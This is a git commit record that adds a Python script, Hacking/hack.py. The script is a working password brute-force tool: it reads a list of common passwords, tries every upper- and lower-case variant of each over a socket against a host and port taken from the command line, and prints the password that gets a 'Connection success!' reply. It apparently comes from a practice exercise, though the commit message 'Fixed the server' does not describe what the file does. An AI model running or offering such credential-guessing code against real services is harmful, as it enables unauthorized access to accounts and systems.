15f0b7e9c3e9bd6d447eb14857f15eb4028b77af
b1rkenspanner <zayed.humayun@g.bracu.ac.bd>
2020-11-01 09:28:45 +0600

    Fixed the server

---
+++ Hacking/hack.py
@@ -0,0 +1,33 @@
+import itertools
+import sys
+import socket
+
+file = open('passwords.txt', 'r')
+passwords = [x.strip('\n') for x in file]
+
+
+def connecting_to_server():
+    connection = socket.socket()
+    argv = sys.argv
+    host, port = argv[1], int(argv[2])
+    connection.connect((host, port))
+    for i in brutforce_password(passwords):
+        password = i
+        connection.send(password.encode())
+        answer = connection.recv(1024)
+        if answer.decode() == 'Connection success!':
+            print(password)
+            break
+
+    connection.close()
+
+
+def brutforce_password(typical_passwords):
+    for password in typical_passwords:
+        passwords = map(''.join, itertools.product(
+            *((c.upper(), c.lower()) for c in password)))
+        for x in passwords:
+            yield x
+
+
+connecting_to_server()
